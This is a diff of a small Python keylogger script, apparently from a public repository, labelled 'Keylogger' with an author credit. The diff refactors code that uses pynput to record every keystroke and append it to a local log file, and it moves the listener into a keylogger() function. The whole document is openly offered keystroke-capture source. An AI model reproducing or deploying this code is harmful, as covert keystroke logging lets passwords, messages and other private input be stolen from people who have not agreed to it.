@@ -1,15 +1,9 @@
-from os import write
-import pynput
-from pynput.keyboard import Key, Listener
-
 ###########################
 #       Keylogger         #
 #   Author: azazelm3dj3d  #
 ###########################
 
-print("-" * 50)
-print("Author: azazelm3dj3d (https://github.com/azazelm3dj3d)")
-print("-" * 50)
+from pynput.keyboard import Key, Listener
 
 keys = []
 count = 0
@@ -28,8 +22,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open("scripts/keylogger/logs/key_log.txt", "a") as f:
-
+    with open("scripts/logs/log.txt", "a+") as f:
         for key in keys:
             format_s = str(key).replace("'", "")
             
@@ -44,5 +37,6 @@ def on_release(key):
     if key == Key.esc:
         return False
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+def keylogger():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
